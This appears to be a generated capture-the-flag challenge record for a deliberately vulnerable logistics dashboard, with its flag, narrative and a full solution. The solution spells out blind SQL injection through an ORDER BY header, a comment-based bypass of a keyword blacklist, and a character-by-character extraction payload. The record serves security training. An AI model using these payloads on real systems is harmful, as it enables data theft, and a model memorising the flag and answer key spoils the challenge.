@@ -1,0 +1,50 @@
+{
+  "run_number": 27,
+  "arm": "sage",
+  "terminal_state": "COMPLETE",
+  "quality_score": 95.0,
+  "calibrated_difficulty": 1.2,
+  "target_difficulty": 1.5,
+  "category": "sqli",
+  "challenge_type": "web",
+  "title": "VeloVortex: Precision Routing manifest",
+  "description": "Welcome to the VeloVortex Logistics Dashboard. As a coordinator, you have access to real-time shipment manifests and driver assignments. Our system is designed for maximum efficiency, allowing you to organize complex routes by any metric. We've recently implemented a new security middleware to scrub malicious inputs, ensuring our logistics data remains pristine. Explore the manifest and ensure the system is as secure as we claim.",
+  "flag": "LEVELUP{OSvjVW6g0e88Oh4SX_gbwYygKhjmudzE}",
+  "solution": "1. Explore the application and log in as 'guest' / 'guest123'.\n2. Navigate to the 'Shipment Manifest' page (/shipments).\n3. Observe that clicking column headers sorts the table. Notice that the sorting is handled via an 'X-Sort-Field' HTTP Header in the request.\n4. Test the header for SQL injection by sending 'X-Sort-Field: status, (CASE WHEN (1=1) THEN 1 ELSE 0 END)'. The page loads normally.\n5. Test a false condition: 'X-Sort-Field: status, (CASE WHEN (1=2) THEN 1 ELSE 0 END)'. Notice the sort order remains the same or changes predictably.\n6. Attempt a subquery: '(SELECT 1)'. The WAF triggers because the word 'SELECT' is blocked if followed by a space.\n7. Bypass the WAF using SQLite comments: 'SELECT/**/setting_value/**/FROM/**/internal_audit'.\n8. Use Boolean-based blind injection to leak the flag from the 'internal_audit' table where 'setting_key' is 'system_integrity_hash'.\n9. Script a solution to iterate through characters: 'status, (CASE WHEN (SUBSTR((SELECT/**/setting_value/**/FROM/**/internal_audit/**/WHERE/**/setting_key=\"system_integrity_hash\"),1,1)=\"L\") THEN 1 ELSE (SELECT/**/1/**/UNION/**/SELECT/**/2) END)'. If the condition is false, the subquery returns two rows, causing a 500 error in SQLite when used as a scalar.",
+  "docker_image_tag": "levelup-challenge-6b57a629",
+  "narrative_context": {
+    "company_name": "VeloVortex Logistics",
+    "industry": "logistics",
+    "scenario": "VeloVortex Logistics recently expanded its global footprint by acquiring 'SwiftStream Regional', a specialist in last-mile delivery. As part of the merger, the IT department is under immense pressure to integrate SwiftStream's proprietary logistics tracking system into the centralized VeloVortex cloud environment before the end-of-quarter rush. The core of this integration is the 'ChronoPath Fleet Orchestrator,' a legacy application that manages hundreds of thousands of active shipments across three continents.\n\nWhile VeloVortex maintains a robust security posture for its primary platforms, the ChronoPath dashboard was developed by a third-party contractor several years ago and contains significant technical debt. The internal security team, currently overwhelmed by the merger's infrastructure overhaul, has flagged the application for a rapid assessment. They are concerned that the search functionality used by logistics coordinators to filter through high-priority manifests might not have undergone the same rigorous code reviews as their native internal tools.",
+    "app_name": "ChronoPath Fleet Orchestrator",
+    "app_purpose": "Allows logistics coordinators to search, filter, and assign drivers to complex delivery routes based on real-time shipment IDs and cargo categories.",
+    "data_theme": "shipment manifests, driver license numbers, vehicle identification numbers (VIN), and GPS delivery coordinates",
+    "flavor_details": {
+      "company_motto": "Precision in Motion",
+      "department": "Global Supply Chain Integration",
+      "recent_event": "A whistleblower from the acquired company suggested that the legacy search engine was 'held together with duct tape and raw queries' to meet the original launch date.",
+      "tech_hints": [
+        "Dynamic Query Builder",
+        "Relational Database Backend",
+        "Legacy PHP/Node Bridge",
+        "URL-encoded search parameters"
+      ]
+    }
+  },
+  "calibration_notes": "Source analysis: The vulnerability is a SQL injection in the ORDER BY clause via the X-Sort-Field header. While it requires finding the injection point and bypassing a keyword blacklist, the blacklist is trivially circumvented because it only checks for keywords followed by a space (e.g., 'SELECT '), allowing bypasses using parentheses or other whitespace characters. The use of SQLite also simplifies exploitation as it allows for straightforward boolean-based or time-based extraction from the internal_audit tabl (target was 1.5)",
+  "verification_level": "smoke_tested",
+  "static_analysis_passed": true,
+  "smoke_test_passed": true,
+  "pipeline_states": [
+    "INIT",
+    "NARRATIVE",
+    "GENERATE",
+    "STATIC_ANALYSIS",
+    "VALIDATE",
+    "CALIBRATE",
+    "SMOKE_TEST",
+    "QUALITY_SCORE",
+    "DEPLOY",
+    "COMPLETE"
+  ]
+}
